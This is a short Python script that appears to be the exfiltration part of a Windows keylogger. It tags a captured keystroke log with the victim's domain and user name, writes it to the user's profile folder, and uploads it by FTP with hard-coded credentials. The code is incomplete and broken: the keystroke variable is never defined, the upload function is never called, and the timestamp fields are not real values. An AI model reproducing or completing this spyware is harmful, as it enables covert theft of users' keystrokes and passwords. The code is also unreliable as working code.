import os
import ftplib
from ftplib import FTP
import subprocess
import time
import datetime
day = datetime.datetime.day
hour = datetime.datetime.hour
sec = datetime.datetime.second
timestamp = '{}.{}.{}'.format(day,hour,sec)
logged_user_os_fix = os.environ['USERPROFILE']
hostname = subprocess.run(['whoami'],stdout=subprocess.PIPE)
hostname = str(hostname.stdout.decode('utf-8'))
hostname = hostname.split('\\')
domain_name = hostname[0]
hostname = hostname[1]
hostname = hostname.split()
hostname = hostname[0]
domain_hostname = '{}.{}'.format(domain_name,hostname)

def ftp_trans():
    path_to_file = '{}\key.log.txt'.format(logged_user_os_fix)
    ftp = FTP('127.0.0.1',user='test',passwd='jjcool4')
    file = open(path_to_file,'rb')
    ftp.cwd('/')
    ftp.storbinary('STOR {}.key.log.txt'.format(domain_hostname),file)
    ftp.quit()
    file.close()

logfile = open('{}\key.log.txt'.format(logged_user_os_fix), 'w+')
logfile.write('{}'.format(keys_pressed_chrome))
logfile.close()

#open and make a log file



